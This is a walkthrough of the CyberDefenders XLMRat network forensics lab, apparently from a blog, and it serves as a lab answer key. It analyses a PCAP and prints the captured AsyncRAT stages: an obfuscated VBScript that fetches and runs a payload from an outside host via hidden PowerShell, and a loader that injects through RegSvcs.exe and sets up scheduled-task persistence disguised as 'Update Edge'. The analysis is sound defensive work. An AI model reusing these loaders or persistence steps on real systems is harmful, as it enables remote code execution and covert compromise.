---
title: Network Forensics - XLMRat @CyberDefender
date: 2025-08-7 00:00:00 +0700
categories: [dfir, blue-teaming, cyber-defender]
tags: [digital-forensics, network-forensics]
author: <author_id>
description: XLMRat Lab @CyberDefender Walkthrough
# toc: false # Uncomment to disable the Table of Contents in the right panel
# comments: false # Uncomment to disable comments
image: /assets/images/preview/cyberdefenders_og.png
--- 

### Scenario
A compromised machine has been flagged due to suspicious network traffic. Your task is to analyze the PCAP file to determine the attack method, identify any malicious payloads, and trace the timeline of events. Focus on how the attacker gained access, what tools or techniques were used, and how the malware operated post-compromise.

### Collected Data
- 236-XLMRat.pcap ~ 600 KB in size

### Tools 
- Wireshark

### Question

#### Q1: The attacker successfully executed a command to download the first stage of the malware. What is the URL from which the first malware stage was installed?

When it comes to packet analysis, especially using Wireshark as the main network forensics tool, the very first thing i would like to examine is a birds eye view of traffics in the `.pcap`.

Wireshark is a powerful tool, also has a section called `Statistics` that contains a bunch of information relate to this packet captured.

**Protocol Hierachy** is the first thing i wanna look into before get my hands dirty by each packet.

![pic1](assets/images/cyberdefender/xmlrat/pic1.png)

Base on overall protocol listed, there were few things interesting. First there were only 2 packets relate to DNS, indicated 1 packet as queried and another one as responsed, so in this `.pcap` there might be only conversation from internal -> external.

The next thing is HTTP, this type of packet might really interesting when in comes to payload inspection.

**Conversation** is the second resources i would like to check.

![pic2](assets/images/cyberdefender/xmlrat/pic2.png)

![pic3](assets/images/cyberdefender/xmlrat/pic3.png)

As i mentioned, there was only one conversation from internal to the external address, but the more interesting thing was the port from TCP section, 222 and 8808 is not common ports and worth for an investigation.

First, before finding evils, let's examine few packet to get more understanding of this incident.

![pic4](assets/images/cyberdefender/xmlrat/pic4.png)

We got a 3 ways handshake from the first 3 packets, from internal IP Address `10.1.9.101` to external IP Address which is `45.126.209.4`, and then the internal host sending an HTTP GET request to the server on unusual port `222` to get a file name `/xlm.txt`. 

Below is the extracted payload:

```shell
Dim LZeWX(88), OodjR, i

' Define each part based on the provided order
LZeWX(0) = "[B"
LZeWX(1) = "YT"
LZeWX(2) = "e["
LZeWX(3) = "]]"
LZeWX(4) = ";$"
LZeWX(5) = "A1"
LZeWX(6) = "23"
LZeWX(7) = "='"
LZeWX(8) = "Ie"
LZeWX(9) = "X("
LZeWX(10) = "Ne"
LZeWX(11) = "W-"
LZeWX(12) = "OB"
LZeWX(13) = "Je"
LZeWX(14) = "CT"
LZeWX(15) = " N"
LZeWX(16) = "eT"
LZeWX(17) = ".W"
LZeWX(18) = "';"
LZeWX(19) = "$B"
LZeWX(20) = "45"
LZeWX(21) = "6="
LZeWX(22) = "'e"
LZeWX(23) = "BC"
LZeWX(24) = "LI"
LZeWX(25) = "eN"
LZeWX(26) = "T)"
LZeWX(27) = ".D"
LZeWX(28) = "OW"
LZeWX(29) = "NL"
LZeWX(30) = "O'"
LZeWX(31) = ";["
LZeWX(32) = "BY"
LZeWX(33) = "Te"
LZeWX(34) = "[]"
LZeWX(35) = "];"
LZeWX(36) = "$C"
LZeWX(37) = "78"
LZeWX(38) = "9="
LZeWX(39) = "'V"
LZeWX(40) = "AN"
LZeWX(41) = "('"
LZeWX(42) = "'h"
LZeWX(43) = "tt"
LZeWX(44) = "p:"
LZeWX(45) = "//"
LZeWX(46) = "45"
LZeWX(47) = ".1"
LZeWX(48) = "26"
LZeWX(49) = ".2"
LZeWX(50) = "09"
LZeWX(51) = ".4"
LZeWX(52) = ":2"
LZeWX(53) = "22/m"
LZeWX(54) = "dm"
LZeWX(55) = ".j"
LZeWX(56) = "pg"
LZeWX(57) = "''"
LZeWX(58) = ")'"
LZeWX(59) = ".R"
LZeWX(60) = "eP"
LZeWX(61) = "LA"
LZeWX(62) = "Ce"
LZeWX(63) = "('"
LZeWX(64) = "VA"
LZeWX(65) = "N'"
LZeWX(66) = ",'"
LZeWX(67) = "AD"
LZeWX(68) = "ST"
LZeWX(69) = "RI"
LZeWX(70) = "NG"
LZeWX(71) = "')"
LZeWX(72) = ";["
LZeWX(73) = "BY"
LZeWX(74) = "Te"
LZeWX(75) = "[]"
LZeWX(76) = "];"
LZeWX(77) = "Ie"
LZeWX(78) = "X("
LZeWX(79) = "$A"
LZeWX(80) = "12"
LZeWX(81) = "3+"
LZeWX(82) = "$B"
LZeWX(83) = "45"
LZeWX(84) = "6+"
LZeWX(85) = "$C"
LZeWX(86) = "78"
LZeWX(87) = "9)"

' Combine the parts into one string
OodjR = ""
For i = 0 To 88 - 1
    OodjR = OodjR & LZeWX(i)
Next

' Use the combinedParts in the shell execution
Set objShell = CreateObject("WScript.Shell")
objShell.Run "Cmd.exe /c POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & OodjR, 0, True
Set objShell = Nothing
```

Combined the payload by it's functions, i got this:
```shell
Set objShell = CreateObject("WScript.Shell")

payload = "[BYTe[]];$A123='IeX(New-Object NeT.WeBJeCT)';$B456='eBCLIeNT).DOWNLO';[BYTe[]];$C789='VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLaCe('VAN','ADSTRING');[BYTe[]];IeX($A123+$B456+$C789)"

objShell.Run "Cmd.exe /c powershell.exe -NoP -Window Hidden -Exec Bypass -NonI " & payload, 0, True

Set objShell = Nothing
```

By analyzing this malicious script, i could identify that the `xlm.txt` presented as a loader, while the second payload `mdm.jpg` indicated the main executable by using VBScript.

> ANSWER: `http://45.126.209.4:222/mdm.jpg`
{: .prompt-info }

#### Q2: Which hosting provider owns the associated IP address?

Since the malicous has been collected, i could grab it and maybe get more information from OSINT, in this lab - AbuseIPDB was my choice.

![pic5](assets/images/cyberdefender/xmlrat/pic5.png)

![pic6](assets/images/cyberdefender/xmlrat/pic6.png)
_Only few reports from others, but there was one information relate to RAT_

Information from ThreatFox indicated the this infrastructure was related to AsyncRat, mostly, and look into these report, there was one line might relate to our case, on port 8808.

![pic7](assets/images/cyberdefender/xmlrat/pic7.png)

> ANSWER: `reliablesite.net`
{: .prompt-info }

#### Q3: By analyzing the malicious scripts, two payloads were identified: a loader and a secondary executable. What is the SHA256 of the malware executable?

One thing that im not mention yet, about Wireshark capabilities, also NIDS / NIPS stuffs, is it's reconstruct entire TCP conversation, which is extremely powerful (the things that tools like `tcpdump` couldn't do, but `tcpdump` serves for other purposes).

In Wireshark, we could extract object from packet captured, it might be in SMB, or in this case from HTTP.

Go to File -> Export Object -> HTTP, and see magical. 

![pic8](assets/images/cyberdefender/xmlrat/pic8.png)

After extracting these files, let inspect the main payload `mdm.jpg`

```shell
$Content = @'


$hexString_bbb = "4D_5A_90_00_03_00_00_00_04_00_00_00_FF_FF_00_00_B8_00_00_00_00_00_00_00_40_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_80_00_00_00_0E_1F_BA_0E_00_B4_09_CD_21_B8_01_4C_CD_21_54_68_69_73_20_70_72_6F_67_72_61_6D_20_63_61_6E_6E_6F_74_20_62_65_20_72_75_6E_20_69_6E_20_44_4F_53_20_6D_6F_64_65_2E_0D_0D_0A_24_00_00_00_00_00_00_00_50_45_00_00_4C_01_03_00_FC_C6_3F_65_00_00_00_00_00_00_00_00_E0_00_02_01_0B_01_08_00_00_F8_00_00_00_0A_00_00_00_00_00_00_2E_16_01_00_00_20_00_00_00_20_01_00_00_00_40_00_00_20_00_00_00_02_00_00_04_00_00_00_00_00_00_00_04_00_00_00_00_00_00_00_00_60_01_00_00_02_00_00_00_00_00_00_02_00_60_85_00_00_10_00_00_10_00_00_00_00_10_00_00_10_00_00_00_00_00_00_10_00_00_00_00_00_00_00_00_00_00_00_DC_15_01_00_4F_00_00_00_00_20_01_00_FF_07_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_40_01_00_0C_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_20_00_00_08_00_00_00_00_00_00_00_00_00_00_00_08_20_00_00_48_00_00_00_00_00_00_00_00_00_00_00_2E_74_65_78_74_00_00_00_34_F6_00_00_00_20_00_00_00_F8_00_00_00_02_00_00_00_00_00_00_00_00_00_00_00_00_00_00_20_00_00_60_2E_72_73_72_63_00_00_00_FF_07_00_00_00_20_01_00_00_08_00_00_00_FA_00_00_00_00_00_00_00_00_00_00_00_00_00_00_40_00_00_40_2E_72_65_6C_6F_63_00_00_0C_00_00_00_00_40_01_00_00_02_00_00_00_02_01_00_00_00_00_..."
$hexString_pe = "4D_5A_90_00_03_00_00_00_04_00_00_00_FF_FF_00_00_B8_00_00_00_00_00_00_00_40_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_80_00_00_00_0E_1F_BA_0E_00_B4_09_CD_21_B8_01_4C_CD_21_54_68_69_73_20_70_72_6F_67_72_61_6D_20_63_61_6E_6E_6F_74_20_62_65_20_72_75_6E_20_69_6E_20_44_4F_53_20_6D_6F_64_65_2E_0D_0D_0A_24_00_00_00_00_00_00_00_50_45_00_00_4C_01_03_00_3F_32_26_90_00_00_00_00_00_00_00_00_E0_00_0E_21_0B_01_30_00_00_22_01_00_00_06_00_00_00_00_00_00_4E_40_01_00_00_20_00_00_00_60_01_00_00_00_40_00_00_20_00_00_00_02_00_00_04_00_00_00_00_00_00_00_06_00_00_00_00_00_00_00_00_A0_01_00_00_02_00_00_00_00_00_00_03_00_60_85_00_00_10_00_00_10_00_00_00_00_10_00_00_10_00_00_00_00_00_00_10_00_00_00_00_00_00_00_00_00_00_00_00_40_01_00_4B_00_00_00_00_60_01_00_64_03_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_80_01_00_0C_00_00_00_BE_3F_01_00_1C_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_00_..."

Sleep 5
[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe = $hexString_pe -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

Sleep 5
$HM = 'L###############o################a#d' -replace '#', ''
$Fu = [Reflection.Assembly]::$HM($pe)


$NK = $Fu.GetType('N#ew#PE#2.P#E'-replace  '#', '')
$MZ = $NK.GetMethod('Execute')
$NA = 'C:\W#######indow############s\Mi####cr'-replace  '#', ''
$AC = $NA + 'osof#####t.NET\Fra###mework\v4.0.303###19\R##egSvc#####s.exe'-replace  '#', ''
$VA = @($AC, $NKbb)

$CM = 'In#################vo################ke'-replace '#', ''
$EY = $MZ.$CM($null, [object[]] $VA)


'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.ps1", $Content)


$Content = @'
@e%Conted%%Conted% off
set "ps=powershell.exe"
set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
set "cmd=C:\Users\Public\Conted.ps1"
%ps% %Contedms% -Command "& '%cmd%'"
exit /b

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)

$Content = @'
on error resume next
Function CreateWshShellObj()
    Dim objName
    objName = "WScript.Shell"
    Set CreateWshShellObj = CreateObject(objName)
End Function

Function GetFilePath()
    Dim filePath
    filePath = "C:\Users\Public\Conted.bat"
    GetFilePath = filePath
End Function

Function GetVisibilitySetting()
    Dim visibility
    visibility = 0
    GetVisibilitySetting = visibility
End Function

Function RunFile(wshShellObj, filePath, visibility)
    wshShellObj.Run filePath, visibility
End Function

Set wshShellObj = CreateWshShellObj()
filePath = GetFilePath()
visibility = GetVisibilitySetting()
Call RunFile(wshShellObj, filePath, visibility)

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)


Sleep 2

$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()

$taskDefinition = $scheduler.NewTask(0)
$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"
$taskDefinition.Settings.Enabled = $true
$taskDefinition.Settings.DisallowStartIfOnBatteries = $false

$trigger = $taskDefinition.Triggers.Create(1)  # 1 = TimeTrigger
$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
$trigger.Repetition.Interval = "PT2M"

# إضافة الـ Action
$action = $taskDefinition.Actions.Create(0)  # 0 = ExecAction
$action.Path = "C:\Users\Public\Conted.vbs"

$taskFolder = $scheduler.GetFolder("\")
$taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
```

This script indicated a multi-stage payload to drop the malwares, also create persistence on victim machine, after decompiled, below are simplier version:

```shell
# Wait
Sleep 5

# Decode byte arrays from hex strings (external $hexString_bbb and $hexString_pe must be defined earlier)
[Byte[]] $NKbb = $hexString_bbb -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }
[Byte[]] $pe = $hexString_pe -split '_' | ForEach-Object { [byte]([convert]::ToInt32($_, 16)) }

Sleep 5

# Load .NET assembly from memory
$HM = 'Load'
$Fu = [Reflection.Assembly]::$HM($pe)

# Get type and method
$NK = $Fu.GetType('NewPE2.PE')
$MZ = $NK.GetMethod('Execute')

# Construct argument: a real system path + $NKbb byte array
$NA = 'C:\Windows\Micr'
$AC = $NA + 'osoft.NET\Framework\v4.0.30319\RegSvcs.exe'
$VA = @($AC, $NKbb)

# Execute
$CM = 'Invoke'
$EY = $MZ.$CM($null, [object[]] $VA)

Below this code is persistence mechanism as you could see in above script
```

Because this "fake" image contains 2 payload in hex, i could easily extract those two and decode by CyberChef, after decoded: 
- payload1 (`$NKbb`)
- payload2 (`pe`)

![pic9](assets/images/cyberdefender/xmlrat/pic9.png)

```shell
PS C:\Users\Administrator\Desktop\CyberDefender\NetworkForensics\XLMRat\xlmrat> Get-FileHash -Algorithm SHA256 payload*

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          1EB7B02E18F67420F42B1D94E74F3B6289D92672A0FB1786C30C03D68E81D798       C:\Users\Administrator\Desktop\CyberDefender\NetworkForensics\XLMRat\xlmrat\payload1
SHA256          2C6C4CD045537E2586EAB73072D790AF362E37E6D4112B1D01F15574491296B8       C:\Users\Administrator\Desktop\CyberDefender\NetworkForensics\XLMRat\xlmrat\payload2
```

> ANSWER: `1EB7B02E18F67420F42B1D94E74F3B6289D92672A0FB1786C30C03D68E81D798`
{: .prompt-info }

#### Q4: What is the malware family label based on Alibaba?

By detected malware excutable, we could get more information by submit it's hash value to OSINT, for this lab, it's VirusTotal. 

And as i mentioned above, when get IOCs information from ThreatFox, those infrastructure belongs to a malware familty `AsyncRAT`

![pic10](assets/images/cyberdefender/xmlrat/pic10.png)

>ANSWER: `AsyncRAT`

#### Q5: What is the timestamp of the malware's creation?

This information could be extract from **Details** section in VirusTotal

![pic11](assets/images/cyberdefender/xmlrat/pic11.png)

>ANSWER: `2023-10-30 15:08`
{: .prompt-info }

#### Q6: Which LOLBin is leveraged for stealthy process execution in this script? Provide the full path.

Let's comeback to this snippet of code

```shell
# Load .NET assembly from memory
$HM = 'Load'
$Fu = [Reflection.Assembly]::$HM($pe)

# Get type and method
$NK = $Fu.GetType('NewPE2.PE')
$MZ = $NK.GetMethod('Execute')

# Construct argument: a real system path + $NKbb byte array
$NA = 'C:\Windows\Micr'
$AC = $NA + 'osoft.NET\Framework\v4.0.30319\RegSvcs.exe'
$VA = @($AC, $NKbb)

# Execute
$CM = 'Invoke'
$EY = $MZ.$CM($null, [object[]] $VA)
```

As you could see here, adversary utilized LOLBin, in this case `RegSvcs.exe` to loads an assembly (`Execute()` with main payload - `NKbb`)

> ANSWER: `C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegSvcs.exe`

#### Q7: The script is designed to drop several files. List the names of the files dropped by the script.

By looking into persitence mechanism, we could see adversary drop multi file type into `Public` folder:
- Contend.ps1
- Contend.bat
- Contend.vbs

```shell
'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.ps1", $Content)


$Content = @'
@e%Conted%%Conted% off
set "ps=powershell.exe"
set "Contedms=-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass"
set "cmd=C:\Users\Public\Conted.ps1"
%ps% %Contedms% -Command "& '%cmd%'"
exit /b

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.bat", $Content)

$Content = @'
on error resume next
Function CreateWshShellObj()
    Dim objName
    objName = "WScript.Shell"
    Set CreateWshShellObj = CreateObject(objName)
End Function

Function GetFilePath()
    Dim filePath
    filePath = "C:\Users\Public\Conted.bat"
    GetFilePath = filePath
End Function

Function GetVisibilitySetting()
    Dim visibility
    visibility = 0
    GetVisibilitySetting = visibility
End Function

Function RunFile(wshShellObj, filePath, visibility)
    wshShellObj.Run filePath, visibility
End Function

Set wshShellObj = CreateWshShellObj()
filePath = GetFilePath()
visibility = GetVisibilitySetting()
Call RunFile(wshShellObj, filePath, visibility)

'@
[IO.File]::WriteAllText("C:\Users\Public\Conted.vbs", $Content)


Sleep 2

$scheduler = New-Object -ComObject Schedule.Service
$scheduler.Connect()

$taskDefinition = $scheduler.NewTask(0)
$taskDefinition.RegistrationInfo.Description = "Runs a script every 2 minutes"
$taskDefinition.Settings.Enabled = $true
$taskDefinition.Settings.DisallowStartIfOnBatteries = $false

$trigger = $taskDefinition.Triggers.Create(1)  # 1 = TimeTrigger
$trigger.StartBoundary = [DateTime]::Now.ToString("yyyy-MM-ddTHH:mm:ss")
$trigger.Repetition.Interval = "PT2M"

# إضافة الـ Action
$action = $taskDefinition.Actions.Create(0)  # 0 = ExecAction
$action.Path = "C:\Users\Public\Conted.vbs"

$taskFolder = $scheduler.GetFolder("\")
$taskFolder.RegisterTaskDefinition("Update Edge", $taskDefinition, 6, $null, $null, 3)
```

> ANSWER: `conted.bat, conted.ps1, conted.vbs`
{: .prompt-info }
